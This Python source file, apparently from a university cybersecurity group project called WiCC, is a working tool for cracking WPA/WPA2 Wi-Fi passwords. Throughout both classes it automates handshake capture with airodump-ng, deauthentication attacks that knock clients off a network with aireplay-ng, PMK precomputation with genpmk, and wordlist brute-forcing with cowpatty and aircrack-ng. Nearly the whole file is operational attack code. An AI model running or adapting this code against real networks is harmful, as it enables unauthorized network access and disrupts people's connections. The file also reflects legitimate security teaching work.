#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
from wicc_network import Network
from subprocess import Popen,PIPE
import threading
import time,sys
import csv


class WPA(EncryptionType):

    def __init__(self, network, interface, wordlist, verbose_level):
        EncryptionType.__init__(self, network, interface, verbose_level)
        self.wordlist = wordlist
        self.pmk = ""

    def scan_network(self, write_directory):
        super().scan_network(write_directory)
        self.show_message("scanned parent")
        valid_handshake = False

        self.calculate_pmk(write_directory)

        write_directory += 'net_attack-01.cap'

        pyrit_cmd = ['pyrit', '-r', write_directory + '.bak', 'analyze']
        cowpatty_cmd = ['cowpatty', '-c', '-r', write_directory]
        de_auth_cmd = ['aireplay-ng', '-0', '3', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface + 'mon']

        second_iterator = 5  # when 15, de-auth's clients on the network

        while not valid_handshake:
            pyrit_out, err = self.execute_command(pyrit_cmd)
            cowpatty_out, err = self.execute_command(cowpatty_cmd)
            valid_handshake = self.filter_pyrit_out(pyrit_out) or self.filter_cowpatty_out(cowpatty_out)
            if not valid_handshake:
                time.sleep(1)
                second_iterator += 1
                if second_iterator == 6:
                    self.show_message("de-authing . . .")
                    out, err = self.execute_command(de_auth_cmd)
                    second_iterator = 0
            else:
                break

        # 1' 46" scanning
        # 5' 15" cracking (4' 30" only on cracking)

    def kill_genpmk(self):
        pgrep_cmd = ['pgrep', 'genpmk']
        pgrep_out, pgrep_err = self.execute_command(pgrep_cmd)

        pgrep_out = pgrep_out.decode('utf-8')

        if pgrep_out != "":
            pids = pgrep_out.split('\n')
            for pid in pids:
                self.execute_command(['kill', '-9', pid])  # kills all processes related with the process
                self.show_message("killed pid " + pid)

    def crack_network(self):
        if self.pmk != "":
            self.kill_genpmk()
            cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r', '/tmp/WiCC/net_attack-01.cap']
            cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
            cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
            password = self.filter_cowpatty_psk(cowpatty_out)
            if password != "":
                self.show_message("password gathered from pmk")
                return password
            else:
                self.show_message("no password on pmk")

        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap', '-w', self.wordlist, '>', '/tmp/WiCC/aicrack-out']
        aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
        aircrack_out = aircrack_out.decode('utf-8')
        password = self.filter_aircrack(aircrack_out)
        return password

    def calculate_pmk(self, write_directory):
        self.pmk = write_directory + 'pmk'
        genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', write_directory + 'pmk', '-s', self.essid]
        genpmk_thread = threading.Thread(target=self.execute_command, args=(genpmk_cmd,))
        genpmk_thread.start()
        genpmk_thread.join(0)
        self.show_message("calculating pmk...")

    def filter_cowpatty_psk(self, output):
        for line in output:
            if line == 'Unable to identify the PSK from the dictionary file. Try expanding your':
                self.show_message("No valid PSK")
                return ""
            elif 'The PSK is' in line:
                words = line.split(" ")
                psk = words[3][1:-2]  # [1:-2] is to remove the " " surrounding the psk
                self.show_message("Found PSK: " + psk)
                return psk
        return ""

#--------------------------------------------------------------------------------------

class WPA_adam(EncryptionType):
    
    def __init__(self, network, wordlist, interface):
        super().__init__(network, interface)
        self.wordlist = wordlist

    def execute_command(self,command):

        # executes a linux command
        # @param takes a list returns a tuple of bytes from stdout and stderr
        process = Popen(command,stdout = PIPE,stderr = PIPE)
        return process.communicate()

    def execute_command_terminate(self,command,count):
        # executes a linux command
        # @param takes a list returns
        # process terminates after count
        process = Popen(command,stdout = PIPE,stderr = PIPE)
        time.sleep(count) 
        process.terminate()

    
    def get_wordlist(self):
        # returns a wordlist
        return self.wordlist

    def set_wordlist(self,wrdlist):

        # sets the wordlist
        self.wordlist = wrdlist
    

    def filter_clients(self, file):
        
        # method to filter clients from the csv file created by Airodump-ng
        # @param file path to be executed/read from
        # returns a list of clients connected to the access point
        

        csv_file = open("files/tester_two-01.csv", "r")
        lines = []
        clients = []
        while True:
            line = csv_file.readline()

            if not line:
                 break

            # check if line is empty
            lineStripped = line.strip()
            if lineStripped == "":
                continue
            
            lines.append(line)

        client_start = False

        for line in lines:
            words = line.split(',')

            if client_start and words[0] != " ":
                    clients.append(words[0])

            if words[0] == "Station MAC":
                    client_start = True

        return clients 

    def check_if_captured(self):

        captured = open('files/captured.csv')
        password = captured.read()
        

        if password != "":
            print("Success Password found")
            print( "Password = " + password)
            return True

        return False



    def crack_network(self):

        # check if wordlist is not null
        if self.wordlist is None:
            print(" error : wordlist has not been set \n")
            return

        # to do:: check if WPS is enable
        # you can do this with the wash program/command
        # wash --interface mon0
        # create a separate function for this

        int_face = 'wlan0'
        tempfile = 'files/tester_two'
        handshake_file = 'files/wpa_handshake'
        
        # remove the current cvs file if one already exists
        self.execute_command(['rm', '-r', 'files'])
        out, err = self.execute_command(['mkdir', 'files'])

        # start scanning and create thread
        command = ['airodump-ng', int_face, '--write', tempfile, '--output-format', 'csv',
        '--bssid',self.target_network.bssid,'--channel',str(self.target_network.channel)]
        thread = threading.Thread(target=self.execute_command_terminate,args=(command,20))
        thread.start()
        thread.join(25)
        # ^^ call execute_command_terminate so airodump-ng terminates after 30 secs
        # no need for this process to run more than 30 seconds
        # as it just captures clients

        # get all clients/stations of the target network/access point
        clients = self.filter_clients("clients")

        #run airodump-ng
        command = ['airodump-ng', int_face, '--write', handshake_file, 
        '--bssid',self.target_network.bssid,'--channel',str(self.target_network.channel)]
        thread_two = threading.Thread(target=self.execute_command_terminate,args=(command, 60))
        thread_two.start()
        thread.join(5)


        for cli in clients:
            print(" debug: client - " + cli)

        client = clients[0]
        print("client of mac kicking from network :: " + client)

        
        #thread to deauth
        command = (['aireplay-ng','--deauth','4','-a',self.target_network.bssid,
        '-c',client,'wlan0'])
        deauth_thread = threading.Thread(target=self.execute_command_terminate,args=(command,10 ))
        deauth_thread.start()
        deauth_thread.join()

        time.sleep(10)

        #thread to crack the password
        command = (['aircrack-ng','files/wpa_handshake-01.cap','-w','tests.txt',
        '-l','files/captured.csv'])
        aircrack_thread = threading.Thread(target=self.execute_command,args=(command, ))
        aircrack_thread.start()
        aircrack_thread.join()

        self.check_if_captured()
    

        return 0

#test_network = Network('VM1234','90:5C:44:24:46:C3', // DEBUG :: just for testing
#'08/12/2019','08/12/2019',11,5,'WPA2','CCMP','PSK',
#3,236,556,'192.168.0.1','VM1234',False,False,3)

#test_WPA = WPA(test_network,"rockyou.txt") // DEBUG :: just for testing
#test_WPA.crack_network() // DEBUG :: just for testing
